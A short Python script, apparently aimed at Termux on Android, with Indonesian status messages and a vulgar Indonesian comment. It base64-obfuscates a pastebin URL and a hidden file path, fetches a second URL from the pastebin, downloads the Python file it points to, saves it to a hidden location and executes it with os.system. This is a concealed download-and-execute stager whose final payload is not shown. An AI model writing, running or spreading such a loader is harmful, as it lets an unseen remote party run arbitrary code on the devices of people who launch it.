#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import base64
import urllib.request
import urllib.error

# MALING LU ANJIR KONTOL PEPEK WOW SELEBEW SILIT LU ITEM KEK KEBO WKWK
ENCODED_PASTEBIN = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2ZVVDBXUkNk"
ENCODED_PATH     = "L2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzci9saWIvLkRyYQ=="


def decode_base64(s):
    try:
        return base64.b64decode(s).decode()
    except Exception:
        return ''


def http_get(url, timeout=15):
    """Return (status_code, body_bytes). Kirim User-Agent agar tidak 403."""
    req = urllib.request.Request(
        url,
        headers={
            'User-Agent': ('Mozilla/5.0 (Linux; Android 10) '
                           'AppleWebKit/537.36 (KHTML, like Gecko) '
                           'Chrome/120.0 Mobile Safari/537.36'),
            'Accept': '*/*',
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, b''
    except Exception:
        return 0, b''


def fetch_script():
    pastebin_url = decode_base64(ENCODED_PASTEBIN)
    script_path  = decode_base64(ENCODED_PATH)

    if not pastebin_url or not script_path:
        print("❌ ERROR: Decode gagal")
        sys.exit(1)

    os.system(f'mkdir -p "{os.path.dirname(script_path)}"')
    try:
        os.remove(script_path)
    except OSError:
        pass

    status, body = http_get(pastebin_url)
    if status != 200:
        print(f"❌ ERROR: Fetch HTTP")
        sys.exit(1)
    github_url = body.decode(errors='replace').strip()

    if not (re.match(r'^https://raw\.githubusercontent\.com/.+\.py$', github_url) or
            re.match(r'^https://[^/]+\.vercel\.app/.+\.py$', github_url)):
        print("❌ ERROR: URL tidak valid")
        sys.exit(1)

    status, body = http_get(github_url)
    if status != 200:
        print(f"❌ ERROR: HTTP {status} (file tidak ditemukan)")
        try:
            os.remove(script_path)
        except OSError:
            pass
        sys.exit(1)

    try:
        with open(script_path, 'wb') as f:
            f.write(body)
    except OSError as e:
        print(f"❌ ERROR: Gagal simpan script")
        sys.exit(1)


def run_script():
    script_path = decode_base64(ENCODED_PATH)

    if os.system('command -v python3 >/dev/null 2>&1') == 0:
        py = 'python3'
    elif os.system('command -v python >/dev/null 2>&1') == 0:
        py = 'python'
    else:
        print("❌ ERROR: Python tidak ditemukan")
        sys.exit(1)

    os.system(f'{py} "{script_path}"')


def main():
    print("Menjalankan script, mohon tunggu 1-5 menit:)")
    fetch_script()
    run_script()


if __name__ == '__main__':
    main()
